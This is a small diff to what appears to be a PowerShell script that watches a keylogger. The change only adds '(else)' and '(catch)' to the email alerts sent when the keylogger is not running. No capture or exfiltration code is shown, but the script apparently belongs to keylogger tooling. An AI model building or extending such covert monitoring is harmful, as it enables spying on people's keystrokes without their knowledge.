@@ -439,14 +439,14 @@ function mail($messageBody){
 				
 			}else{
 				"Keylogger is not running"
-				mail "Keylogger is not running see email headers for more details"
+				mail "Keylogger is not running see email headers for more details (else)"
 				exit
 			}
 			
 		}
 		catch{
 			"Keylogger is not running"
-			mail "Keylogger is not running see email headers for more details"
+			mail "Keylogger is not running see email headers for more details (catch)"
 			exit
 		}
 	}
